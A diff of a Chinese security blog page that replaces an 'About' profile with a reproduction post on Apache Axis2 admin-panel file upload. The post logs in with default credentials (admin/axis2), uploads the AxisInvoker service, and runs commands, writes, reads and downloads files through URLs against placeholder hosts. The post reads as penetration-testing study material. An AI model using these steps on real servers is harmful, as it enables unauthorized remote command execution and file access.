@@ -10,7 +10,7 @@
     
     
     
-    <title>About | spaceman&#39;blog</title>
+    <title>Apache Axis2 后台文件上传 | spaceman&#39;blog</title>
     <link href="https://spaceman-911.gitee.io" rel="prefetch" />
 
     
@@ -149,7 +149,7 @@
                 
                 
                 
-                <li class="current">
+                <li class="">
                     <a href="/about">
                         <i class="fa fa-user"></i>关于
                     </a>
@@ -164,21 +164,34 @@
         <div class="container">
             <div class="row">
                 <div class="col-md-8 gal-right" id="mainstay">
-                    <!-- 搜索页面(尽可能接近ZanBlog搜索功能) -->
-
-
+                    
 <article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="https://spaceman-911.gitee.io">spaceman&#39;blog</a>
+        >
+        <span>Apache Axis2 后台文件上传</span>
+    </div>
     <!-- 大型设备详细文章 -->
     <div class="hidden-xs">
         <div class="title-article">
             <h1>
-                <a href="/about/index.html">About</a>
+                <a href="/2021/03/15/Apache-Axis2-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">Apache Axis2 后台文件上传</a>
             </h1>
         </div>
         <div class="tag-article">
+            
             <span class="label label-gal">
-                <i class="fa fa-calendar"></i> 2021-02-10
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/getshell/">getshell</a>
+                
             </span>
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2021-03-15
+            </span>
+            
         </div>
     </div>
     <!-- 小型设备详细文章 -->
@@ -186,29 +199,52 @@
         <center>
             <div class="title-article">
                 <h4>
-                    <a href="/about/index.html">About</a>
+                    <a href="/2021/03/15/Apache-Axis2-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">Apache Axis2 后台文件上传</a>
                 </h4>
             </div>
             <p>
-                <i class="fa fa-calendar"></i> 2021-02-10
+                <i class="fa fa-calendar"></i> 2021-03-15
+            </p>
+            <p>
+                
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/getshell/">getshell</a>
+                
+                
+                
             </p>
         </center>
     </div>
     <div class="content-article">
-        <ul>
-<li><strong>CTF：会一点 web、misc</strong></li>
-<li><strong>渗透：会一点工具的使用和一点实战</strong></li>
-<li><strong>战队：Firebasky 后援团</strong></li>
-<li><strong>团队：太菜了，暂无</strong></li>
-<li><strong>学校：新疆师范大学</strong></li>
-<li><strong>爱好：女</strong></li>
-<li><strong>特长：划水、脚本梭哈</strong></li>
-<li><strong>QQ：1006848997</strong></li>
-</ul>
+        <h1 id="Apache-Axis2-后台文件上传"><a href="#Apache-Axis2-后台文件上传" class="headerlink" title="Apache Axis2 后台文件上传"></a>Apache Axis2 后台文件上传</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Axis是一个开源、基于XML的Web服务架构。最开始由IBM公司研发,叫IBM-SOAP。后来由Apache基金会在SOAP的基础上推出了AXIS。AXIS本质是一个Java语言编写的SOAP引擎。利用它我们可以在各种分布式应用中,让各个应用能够彼此操作、交互。 </p>
+<p><img src="/2021/03/15/Apache-Axis2-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210315012427121.png" alt="image-20210315012427121"></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>默认后台路径：/axis2-admin/login</p>
+<p>默认账号密码：admin/axis2</p>
+<p>工具下载地址： <a target="_blank" rel="noopener" href="https://github.com/CaledoniaProject/AxisInvoker">https://github.com/CaledoniaProject/AxisInvoker</a></p>
+<p>访问后台地址，使用默认密码成功登录， 点击Upload Service上传aar包进行命令执行</p>
+<p><img src="/2021/03/15/Apache-Axis2-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210315012533689.png" alt="image-20210315012533689"></p>
+<p>上传工具中 build目录中的 aar 包，成功上传</p>
+<p><img src="/2021/03/15/Apache-Axis2-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210315012701394.png" alt="image-20210315012701394"></p>
+<p><img src="/2021/03/15/Apache-Axis2-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210315012723736.png" alt="image-20210315012723736"></p>
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>windows 或 linux 均可正常执行</p>
+<p>根据工具md文档操作如下</p>
+<p>运行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;axis2&#x2F;services&#x2F;AxisInvoker&#x2F;exec?cmd&#x3D;whoami</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/15/Apache-Axis2-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210315012948426.png" alt="image-20210315012948426"></p>
+<p>写文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;axis2&#x2F;services&#x2F;AxisInvoker&#x2F;write?path&#x3D;c:\566.txt&amp;content&#x3D;123</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/15/Apache-Axis2-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210315011245808.png" alt="image-20210315011245808"></p>
+<p>读取文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;axis2&#x2F;services&#x2F;AxisInvoker&#x2F;read?path&#x3D;c:\566.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/15/Apache-Axis2-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210315011503080.png" alt="image-20210315011503080"></p>
+<p>下载文件并将其保存</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;axis2&#x2F;services&#x2F;AxisInvoker&#x2F;download?url&#x3D;http:&#x2F;&#x2F;www.baidu.com&amp;file&#x3D;c:\123.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/15/Apache-Axis2-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210315011728859.png" alt="image-20210315011728859"></p>
+<p><img src="/2021/03/15/Apache-Axis2-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210315011808668.png" alt="image-20210315011808668"></p>
 
     </div>
 </article>
-
 
 
                 </div>
@@ -361,6 +397,12 @@
             
             <li class="list-group-item">
                 <span class="post-title">
+                    <a href="/2021/03/11/%E6%B5%AA%E6%BD%AEClusterEngine4-0%E9%9B%86%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0RCE/">浪潮ClusterEngine4.0集群管理系统前台RCE</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
                     <a href="/2021/03/11/%E5%BC%B1%E5%AF%86%E7%A0%81%E4%B8%AD%E5%8F%91%E7%8E%B0%E7%9A%84%E6%8E%88%E6%9D%83%E7%BB%95%E8%BF%87/">弱密码中发现的授权绕过</a>
                 </span>
             </li>
@@ -374,12 +416,6 @@
             <li class="list-group-item">
                 <span class="post-title">
                     <a href="/2021/03/14/VMware-vCenter-Server-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">VMware vCenter Server 任意文件读取</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2021/03/15/CVE-2021-25646-Apache-Druid%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">CVE-2021-25646 Apache Druid远程代码执行</a>
                 </span>
             </li>
             
@@ -400,17 +436,17 @@
 
                 
                 <li>
-                    <a href="/about/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                    <a href="/2021/03/15/Apache-Axis2-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/about/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                    <a href="/2021/03/15/Apache-Axis2-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/about/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                    <a href="/2021/03/15/Apache-Axis2-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
                 </li>
                 
             </ul>
@@ -418,17 +454,17 @@
                 
                 <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
     
-    <a href="/tags/CVE/" style="font-size: 10.89949698303401px;" class="tag-cloud-link">CVE</a>
+    <a href="/tags/CVE/" style="font-size: 18.06577171486216px;" class="tag-cloud-link">CVE</a>
     
-    <a href="/tags/MSF/" style="font-size: 10.622299491631981px;" class="tag-cloud-link">MSF</a>
+    <a href="/tags/MSF/" style="font-size: 12.35387095922404px;" class="tag-cloud-link">MSF</a>
     
-    <a href="/tags/getshell/" style="font-size: 15.117805409891288px;" class="tag-cloud-link">getshell</a>
+    <a href="/tags/getshell/" style="font-size: 17.347591831627398px;" class="tag-cloud-link">getshell</a>
     
-    <a href="/tags/%E6%9D%83%E9%99%90/" style="font-size: 11.699601553963877px;" class="tag-cloud-link">权限</a>
+    <a href="/tags/%E6%9D%83%E9%99%90/" style="font-size: 19.325560208917985px;" class="tag-cloud-link">权限</a>
     
-    <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" style="font-size: 10.939816814919052px;" class="tag-cloud-link">信息泄露</a>
+    <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" style="font-size: 13.464070691203194px;" class="tag-cloud-link">信息泄露</a>
     
-    <a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" style="font-size: 18.716318485009687px;" class="tag-cloud-link">任意文件读取</a>
+    <a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" style="font-size: 10.31575589860412px;" class="tag-cloud-link">任意文件读取</a>
     
 </div>
                 
